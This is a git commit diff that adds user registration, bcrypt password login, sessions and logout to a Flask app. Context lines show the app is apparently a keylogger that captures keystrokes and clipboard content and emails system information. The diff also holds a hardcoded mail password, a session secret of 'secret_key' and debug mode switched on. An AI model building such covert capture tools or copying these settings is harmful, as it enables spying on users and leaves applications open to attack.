e6d160efaec62ddd04b0118065687a9de36594ad
simona <simonarumao@gmail.com>
2024-05-01 14:39:00 +0530

    login

--- app.py
+++ app.py
@@ -1,4 +1,4 @@
-from flask import Flask, render_template, Response,request,redirect,url_for
+from flask import Flask, render_template, Response,request,redirect,url_for,session
 from flask_mail import Mail, Message
 import threading
 import keyboard
@@ -11,6 +11,9 @@ from reportlab.pdfgen import canvas
 import platform
 import socket
 import requests
+from flask_sqlalchemy import SQLAlchemy
+import bcrypt
+
 
 
 
@@ -24,6 +27,32 @@ app.config['MAIL_PASSWORD'] = 'c22edf8f9d84f904f890efb8aa1a5e78'
 app.config['MAIL_USE_TLS'] = True
 app.config['MAIL_USE_SSL'] = False
 mail = Mail(app)
+
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
+db = SQLAlchemy(app)
+app.secret_key = 'secret_key'
+
+
+
+class User(db.Model):
+    id = db.Column(db.Integer, primary_key = True)
+    name = db.Column(db.String(100), nullable=False)
+    email = db.Column(db.String(100), unique=True)
+    password = db.Column(db.String(100))
+
+
+    def __init__(self,email,password,name):
+        self.name = name
+        self.email = email
+        self.password = bcrypt.hashpw(password.encode('utf-8'),bcrypt.gensalt()).decode('utf-8')
+
+    def check_password(self,password):
+        return bcrypt.checkpw(password.encode('utf-8'),self.password.encode('utf-8'))
+    
+
+with app.app_context():
+    db.create_all()
+
 
 
 # Keylogger class to capture keystrokes and clipboard content
@@ -116,9 +145,48 @@ def signal_handler(sig, frame):
 signal.signal(signal.SIGINT, signal_handler)
 
 
+
+@app.route('/register',methods=['GET','POST'])
+def register():
+    if request.method =='POST':
+        name = request.form['name']
+        email = request.form['email']
+        password = request.form['password']
+
+        new_user = User(name=name,email=email,password=password)
+        db.session.add(new_user)
+        db.session.commit()
+        return redirect('/login')
+
+    return render_template('register.html')
+
+
+@app.route('/login',methods=['GET','POST'])
+def login():
+    if request.method =='POST':
+        email = request.form['email']
+        password = request.form['password']
+
+        user = User.query.filter_by(email=email).first()
+
+        if user and user.check_password(password):
+     
+            session['email'] = user.email
+
+            return redirect('/')
+        else:
+            return render_template('login.html',error='invalid user')
+
+    return render_template('login.html')
+
 @app.route('/')
 def index():
-    return render_template('index.html')
+    if 'email' in session:
+        return render_template('index.html')
+    else:
+        return redirect('/login')
+    
+
 # Route to display logged keystrokes
 @app.route('/logged_keystrokes')
 def logged_keystrokes():
@@ -204,6 +272,12 @@ def send_system_email():
     mail.send(message)
 
 
+@app.route('/logout')
+def logout():
+    session.pop('email',None)
+    return redirect('/login')
+
+
 # Function to generate PDF document
 def generate_pdf(content):
     buffer = BytesIO()
@@ -230,8 +304,8 @@ def generate_system_info_pdf(system_data):
     buffer.close()
     return pdf
 
-# if __name__ == '__main__':
-#     app.run(debug=True)
+if __name__ == '__main__':
+    app.run(debug=True)
 
 
 
--- chrome_extension/background.js
+++ chrome_extension/background.js
@@ -1,6 +1,6 @@
 // background.js
 
 chrome.browserAction.onClicked.addListener(function(tab) {
-    chrome.tabs.create({ url: "http://localhost:5000" }); // Replace 5000 with your Flask app's port number
+    chrome.tabs.create({ url: "http://localhost:5000/" }); // Replace 5000 with your Flask app's port number
 });
 
